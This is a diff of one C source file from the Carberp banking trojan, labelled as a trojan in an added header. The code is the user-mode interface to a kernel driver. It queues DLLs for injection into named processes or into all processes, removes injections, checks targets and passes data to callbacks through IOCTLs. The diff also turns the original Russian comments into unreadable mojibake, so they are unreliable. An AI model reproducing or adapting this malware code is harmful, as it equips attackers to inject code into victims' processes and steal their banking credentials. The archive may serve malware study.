@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "GetApi.h"
 #include "windows.h"
 #include "DriverConnect.h"
@@ -8,7 +19,7 @@
 
 
 //
-// Структура передается в драйвер(смотреть DriverIOControl)
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ(пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DriverIOControl)
 //
 typedef struct __TNOTIFY{
 	HANDLE hEvent;
@@ -20,7 +31,7 @@ typedef struct __TNOTIFY{
 }TNOTIFY,*PTNOTIFY;
 
 //
-//Смотреть DriverAddInjectModule
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DriverAddInjectModule
 //
 typedef struct __TNOTIFY_LOAD_MODULE{
 	PSTR ProcessName;		// target process name
@@ -32,7 +43,7 @@ typedef struct __TNOTIFY_LOAD_MODULE{
 }TNOTIFY_LOAD_MODULE,*PTNOTIFY_LOAD_MODULE;
 
 //
-//	Смотреть DriverRemoveInjectModule
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DriverRemoveInjectModule
 //
 typedef struct __TNOTIFY_REMOVE_MODULE{
 	PVOID injDesc;
@@ -41,31 +52,31 @@ typedef struct __TNOTIFY_REMOVE_MODULE{
 
 
 //
-//	Функция для общения с драйвером 
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
 //
 BOOL DriverIOControl(PUSER_INIT_NOTIFY uin,DWORD code,PVOID in_data,DWORD in_size,PVOID out_data,DWORD out_size,DWORD t_wait);
 
 
 
 //
-// Убирает модуль из списка длл для инжекта
-//	Module	-	то что вернула DriverAddInjectModule
-//	возвращает TRUE если все хорошо.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//	Module	-	пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ DriverAddInjectModule
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ TRUE пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 BOOL DriverRemoveInjectModule(PUSER_INIT_NOTIFY puin,PVOID Module);
 
 
 
 //
-//	Тестирует общение с драйвером.
-//	Возвращает TRUE если общение возможно.
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ TRUE пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 //
 BOOL DriverIOTest(PUSER_INIT_NOTIFY puin,DWORD t_wait);
 
 
 
 //
-//	Тестирует общение с драйвером.
-//	Возвращает TRUE если общение возможно.
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ TRUE пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 //
 BOOL DriverIOTest(PUSER_INIT_NOTIFY puin,DWORD t_wait){
 	ULONG Result = 0;
@@ -78,9 +89,9 @@ BOOL DriverIOTest(PUSER_INIT_NOTIFY puin,DWORD t_wait){
 
 
 //
-//  Убирает запрещает инжект в процесс
-//	ProcessName	-	имя процесса
-//	возвращает TRUE если все хорошо.
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//	ProcessName	-	пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ TRUE пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 //
 BOOL DriverRemoveInjectToProcess(PUSER_INIT_NOTIFY puin,PWCHAR ProcessName)
 {
@@ -89,7 +100,7 @@ BOOL DriverRemoveInjectToProcess(PUSER_INIT_NOTIFY puin,PWCHAR ProcessName)
 
 	nrm.injDesc = ProcessName;
 
-// ожидаем 2 мин. ответа
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 2 пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ
 //
 	if(! DriverIOControl(puin,IO_CONTROL_DRIVER_REMOVE_MODULE,&nrm,sizeof(nrm),&Stat,sizeof(Stat),120*1000) )
 			return NULL;
@@ -101,11 +112,11 @@ BOOL DriverRemoveInjectToProcess(PUSER_INIT_NOTIFY puin,PWCHAR ProcessName)
 
 
 //
-//	puin - значение переданное в процедуру Notify 
-//	Module - указатель длл в памяти
-//  TargetProcess - имя процесса в который нужно внедрить, если NULL то во все процессы.
-//  size	- размер длл в памяти
-//  flags -  дополнительные флаги для загрузки, пока передавать 0. если нужно можно будет расширить.
+//	puin - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Notify 
+//	Module - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//  TargetProcess - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ NULL пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+//  size	- пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//  flags -  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 0. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 PVOID DriverAddInjectModule(PUSER_INIT_NOTIFY puin, PVOID Module,PCHAR TargetProcess,ULONG size,ULONG Flags){
 	TNOTIFY_LOAD_MODULE nlm;
 	PVOID Stat = NULL;
@@ -117,7 +128,7 @@ PVOID DriverAddInjectModule(PUSER_INIT_NOTIFY puin, PVOID Module,PCHAR TargetPro
 	nlm.ProcessName = TargetProcess;
 	nlm.Size        = size;
 
-	// ожидаем 2 мин. ответа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 2 пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ
 	//
 	if(! DriverIOControl(puin,IO_CONTROL_DRIVER_LOAD_MODULE,&nlm,sizeof(nlm),&Stat,sizeof(Stat),120*1000) )
 			return NULL;
@@ -126,10 +137,10 @@ PVOID DriverAddInjectModule(PUSER_INIT_NOTIFY puin, PVOID Module,PCHAR TargetPro
 	return Stat ;
 };
 
-//	регистрирует GlobalCallback
-//	ThreadId - поток в котором будет вызывать CallBack процедура	
-//	CallBack - CallBack процедура
-//	lParam	 -	дополнительный параметр, передается в CallBack
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ GlobalCallback
+//	ThreadId - пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ CallBack пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ	
+//	CallBack - CallBack пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//	lParam	 -	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ CallBack
 BOOL DriverRegisterGlobalCallback (PUSER_INIT_NOTIFY puin ,DWORD ThreadId,TGlobalCallBack CallBack,LPVOID lParam)
 {
 	struct {
@@ -145,7 +156,7 @@ BOOL DriverRegisterGlobalCallback (PUSER_INIT_NOTIFY puin ,DWORD ThreadId,TGloba
 	gc.callback = CallBack;
 	gc.lParam	= lParam;
 
-	// ожидаем 2 мин. ответа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 2 пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ
 	//
 
 
@@ -158,10 +169,10 @@ BOOL DriverRegisterGlobalCallback (PUSER_INIT_NOTIFY puin ,DWORD ThreadId,TGloba
 
 
 //
-//	Посылает данные в GlobalCallBack
-//	ThreadId		-	Поток какой получит эти данные,если 0 все зарегистрированные потоки
-//	Memory			-	Указатель на данные
-//	SizeMemory		-	Размер памяти
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ GlobalCallBack
+//	ThreadId		-	пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,пїЅпїЅпїЅпїЅ 0 пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//	Memory			-	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//	SizeMemory		-	пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 BOOL DriverSendDataToGlobalCallBackEx(PUSER_INIT_NOTIFY puin,HANDLE ThreadId,PVOID Memory,ULONG SizeMemory)
 {
 	struct {
@@ -175,7 +186,7 @@ BOOL DriverSendDataToGlobalCallBackEx(PUSER_INIT_NOTIFY puin,HANDLE ThreadId,PVO
 	gc.Buffer			= Memory;
 	gc.Size		= SizeMemory;
 
-	// ожидаем 2 мин. ответа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 2 пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ
 	//
 	if(! DriverIOControl(puin,IO_CONTROL_DRIVER_SEND_DATA_TO_GLOBALCALLBACK,&gc,sizeof(gc),&Stat,sizeof(Stat),120*1000) )
 			return NULL;
@@ -186,9 +197,9 @@ BOOL DriverSendDataToGlobalCallBackEx(PUSER_INIT_NOTIFY puin,HANDLE ThreadId,PVO
 
 
 //
-//	Посылает данные в GlobalCallBack
-//	Memory			-	Указатель на данные
-//	SizeMemory		-	Размер памяти
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ GlobalCallBack
+//	Memory			-	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//	SizeMemory		-	пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 BOOL DriverSendDataToGlobalCallBack(PUSER_INIT_NOTIFY puin,PVOID Memory,ULONG SizeMemory)
 {
 	return DriverSendDataToGlobalCallBackEx(puin,0,Memory,SizeMemory);
@@ -197,15 +208,15 @@ BOOL DriverSendDataToGlobalCallBack(PUSER_INIT_NOTIFY puin,PVOID Memory,ULONG Si
 
 
 //
-// посылает управляющие "коды" драйверу
-// code - код команды
-//	in_data - входные данные
-//  in_size - размер входных данных
-//	out_data - выходные данные
-//  out_size - размер выходных данных
-//  t_wait   - время(в мс) ожидание обработки данных(должно быть достаточно большое чтоб успел переключиться контекст потоков)
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ "пїЅпїЅпїЅпїЅ" пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+// code - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//	in_data - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//  in_size - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//	out_data - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//  out_size - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//  t_wait   - пїЅпїЅпїЅпїЅпїЅ(пїЅ пїЅпїЅ) пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ(пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 //  
-//  возвращает TRUE если общение(евент hCompleat  установили в сиг. сост ) с драйвером возможно.
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ TRUE пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ(пїЅпїЅпїЅпїЅпїЅ hCompleat  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ ) пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
 BOOL DriverIOControl(PUSER_INIT_NOTIFY uin,DWORD code,PVOID in_data,DWORD in_size,PVOID out_data,DWORD out_size,DWORD t_wait){
 	HANDLE	 hEvent;
@@ -253,8 +264,8 @@ BOOL DriverIOControl(PUSER_INIT_NOTIFY uin,DWORD code,PVOID in_data,DWORD in_siz
 
 
 //
-//	Проверяет будет ли инжектится в указанный процесс, какая либо длл
-//	uProcessName	-	имя процесса
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+//	uProcessName	-	пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //
 BOOL CheckIsInjectToProcess(PUSER_INIT_NOTIFY puin, PWCHAR uProcessName)
 {
@@ -263,7 +274,7 @@ BOOL CheckIsInjectToProcess(PUSER_INIT_NOTIFY puin, PWCHAR uProcessName)
 	uStr.Length = uStr.MaximumLength = m_wcslen(uProcessName)*sizeof(WCHAR);
 	uStr.Buffer = uProcessName;
 
-	// ожидаем 2 мин. ответа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 2 пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ
 	//
 	if(! DriverIOControl(puin,IO_CONTROL_DRIVER_CHEK_PROCESS,&uStr,sizeof(uStr),&Result,sizeof(Result),120*1000) )
 			return NULL;
